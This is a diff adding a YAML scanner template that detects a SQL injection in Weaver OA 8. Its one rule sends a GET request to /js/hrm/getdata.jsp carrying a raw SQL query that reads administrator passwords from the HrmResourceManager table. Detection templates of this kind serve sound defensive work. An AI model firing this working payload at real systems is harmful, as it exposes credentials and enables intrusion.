@@ -1,0 +1,18 @@
+name: Weaver_OA_8_SQL_injection
+transport: http
+set: {}
+detail:
+  dock: app="Weaver-OA"
+  product: Weaver OA 8
+  homepage: https://weaver.com/
+  impact: There is a SQL injection vulnerability in Pan micro OA V8, through which
+    an attacker can obtain administrator and server privileges.
+  description: ''
+rules:
+  r1:
+    method: GET
+    path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
+    follow_redirects: false
+    expression: response.status == 200 && !response.body.bcontains(b'404 Not Found') &&
+      !response.body.bcontains(b'&lt;html&gt;') && response.body.bcontains(b'script')
+expression: r1()
